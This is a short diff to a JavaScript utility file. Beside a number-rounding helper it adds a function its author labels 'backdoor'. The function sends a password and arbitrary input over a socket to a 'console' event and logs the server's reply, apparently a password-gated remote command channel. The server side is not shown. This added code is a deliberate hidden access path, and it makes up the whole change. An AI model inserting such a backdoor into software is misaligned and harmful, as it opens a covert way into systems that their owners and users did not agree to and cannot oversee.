@@ -12,3 +12,12 @@ function round(number, d) {
   return Number(Math.round(number+'e'+d)+'e-'+d);
 }
 //
+
+//backdoor
+function backdoor(password,input){
+  socket.emit("console",[password,input])
+}
+socket.on("console_response", function(data){
+  console.log(data)
+})
+//
